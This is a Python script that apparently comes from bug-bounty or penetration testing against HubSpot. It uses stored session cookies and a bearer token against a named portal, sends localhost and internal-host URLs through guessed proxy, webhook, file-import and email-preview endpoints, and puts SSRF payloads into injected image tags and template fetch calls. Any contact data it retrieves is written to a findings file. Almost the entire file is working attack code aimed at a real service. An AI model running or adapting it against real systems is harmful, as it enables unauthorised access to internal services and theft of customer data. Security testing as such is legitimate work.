#!/usr/bin/env python3
"""
Test for proxy/SSRF vulnerabilities
Inspired by Finding #20 - Proxy allows access to internal domains
"""

import requests
import json
import os
from dotenv import load_dotenv
import urllib3

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
TARGET_PORTAL = '46962361'

print("="*80)
print("PROXY & SSRF ENDPOINT DISCOVERY")
print("="*80)

session = requests.Session()
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        session.cookies.set(key, value, domain='.hubspot.com')

headers_token = {
    'Authorization': f'Bearer {ACCESS_TOKEN}',
}

# ============================================================================
# 1. TEST COMMON PROXY PATTERNS
# ============================================================================

print("\n[1] TESTING COMMON PROXY ENDPOINTS")
print("="*80)

# Internal services that might be accessible
internal_targets = [
    f'http://localhost/contacts/{TARGET_PORTAL}/contact/1',
    f'http://127.0.0.1/contacts/{TARGET_PORTAL}/contact/1',
    f'http://internal.hubspot.com/contacts/{TARGET_PORTAL}/contact/1',
    f'http://api.internal.hubspot.com/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}',
]

# Proxy endpoint patterns to test
proxy_patterns = [
    'https://app.hubspot.com/proxy',
    'https://app.hubspot.com/api/proxy',
    'https://api.hubapi.com/proxy',
    'https://api.hubapi.com/fetch',
    'https://api.hubapi.com/url',
    'https://app.hubspot.com/fetch-url',
]

for proxy_url in proxy_patterns:
    for target in internal_targets:
        # Try as query parameter
        test_url = f'{proxy_url}?url={target}'

        print(f"\n{test_url[:80]}...")

        try:
            r = session.get(test_url, headers={'User-Agent': 'Mozilla/5.0'}, verify=False, timeout=5)
            print(f"  Status: {r.status_code}")

            if r.status_code == 200 and len(r.text) > 100:
                print(f"  *** SUCCESS! ***")
                print(f"  Size: {len(r.text)} bytes")

                # Check for contact data
                if 'firstname' in r.text.lower() or 'super_secret' in r.text.lower():
                    print(f"  *** CONTAINS CONTACT DATA! ***")
                    print(f"  {r.text[:500]}")

                    with open('/home/user/Hub/findings/PROXY_CONTACT_DATA.txt', 'w') as f:
                        f.write(f"URL: {test_url}\n\n")
                        f.write(r.text)
        except:
            pass

        # Try as POST body
        try:
            r = session.post(proxy_url, json={'url': target}, verify=False, timeout=5)
            print(f"  POST: {r.status_code}")

            if r.status_code == 200 and len(r.text) > 100:
                print(f"  *** POST SUCCESS! ***")
        except:
            pass

# ============================================================================
# 2. TEST WEBHOOK/CALLBACK ENDPOINTS
# ============================================================================

print("\n" + "="*80)
print("[2] TESTING WEBHOOK/CALLBACK SSRF")
print("="*80)

webhook_endpoints = [
    'https://api.hubapi.com/webhooks/v1/test',
    'https://api.hubapi.com/integrations/v1/test-connection',
    f'https://api.hubapi.com/webhooks/v1/{TARGET_PORTAL}/test',
]

for url in webhook_endpoints:
    test_payloads = [
        {'url': f'http://localhost/contacts/{TARGET_PORTAL}/contact/1'},
        {'callback_url': f'http://localhost/contacts/{TARGET_PORTAL}/contact/1'},
        {'endpoint': f'http://localhost/contacts/{TARGET_PORTAL}/contact/1'},
    ]

    for payload in test_payloads:
        print(f"\nPOST {url[:70]}...")
        print(f"  Payload: {json.dumps(payload)[:60]}...")

        try:
            r = session.post(url, headers=headers_token, json=payload, verify=False, timeout=5)
            print(f"  Status: {r.status_code}")

            if r.status_code not in [404, 401, 403]:
                try:
                    print(f"  Response: {r.text[:300]}")
                except:
                    pass
        except:
            pass

# ============================================================================
# 3. TEST FILE FETCH/IMPORT ENDPOINTS
# ============================================================================

print("\n" + "="*80)
print("[3] TESTING FILE FETCH/IMPORT ENDPOINTS")
print("="*80)

file_endpoints = [
    'https://api.hubapi.com/filemanager/api/v3/files/import',
    'https://api.hubapi.com/files/v3/import',
    f'https://api.hubapi.com/files/v3/files/import?portalId={TARGET_PORTAL}',
]

for url in file_endpoints:
    # Try to import from internal URL
    payloads = [
        {
            'url': f'http://localhost/api/contacts/v1/contact/vid/1?portalId={TARGET_PORTAL}',
            'portalId': TARGET_PORTAL
        },
        {
            'file_url': f'http://internal.hubspot.com/contacts/{TARGET_PORTAL}/export.json',
            'portalId': TARGET_PORTAL
        },
    ]

    for payload in payloads:
        print(f"\nPOST {url[:70]}...")

        try:
            r = session.post(url, headers=headers_token, json=payload, verify=False, timeout=10)
            print(f"  Status: {r.status_code}")

            if r.status_code == 200:
                print(f"  *** SUCCESS! ***")
                try:
                    data = r.json()
                    print(f"  {json.dumps(data, indent=2)[:500]}")
                except:
                    print(f"  {r.text[:300]}")
        except:
            pass

# ============================================================================
# 4. TEST EMAIL/SMS PREVIEW ENDPOINTS (Common SSRF vector)
# ============================================================================

print("\n" + "="*80)
print("[4] TESTING EMAIL/SMS PREVIEW SSRF")
print("="*80)

preview_endpoints = [
    'https://api.hubapi.com/marketing/v3/emails/preview',
    'https://api.hubapi.com/email/v1/preview',
    f'https://api.hubapi.com/email/preview?portalId={TARGET_PORTAL}',
]

for url in preview_endpoints:
    # Try to include internal URL in email template
    payloads = [
        {
            'html': f'<img src="http://localhost/api/contacts/v1/contact/vid/1?portalId={TARGET_PORTAL}">',
            'portalId': TARGET_PORTAL
        },
        {
            'template': {
                'html': f'{{{{ fetch("http://localhost/contacts/{TARGET_PORTAL}/contact/1") }}}}'
            },
            'portalId': TARGET_PORTAL
        },
    ]

    for payload in payloads:
        print(f"\nPOST {url[:70]}...")

        try:
            r = session.post(url, headers=headers_token, json=payload, verify=False, timeout=10)
            print(f"  Status: {r.status_code}")

            if r.status_code not in [404, 401, 403, 405]:
                try:
                    print(f"  Response: {r.text[:300]}")
                except:
                    pass
        except:
            pass

print("\n" + "="*80)
print("PROXY/SSRF TESTING COMPLETE")
print("="*80)
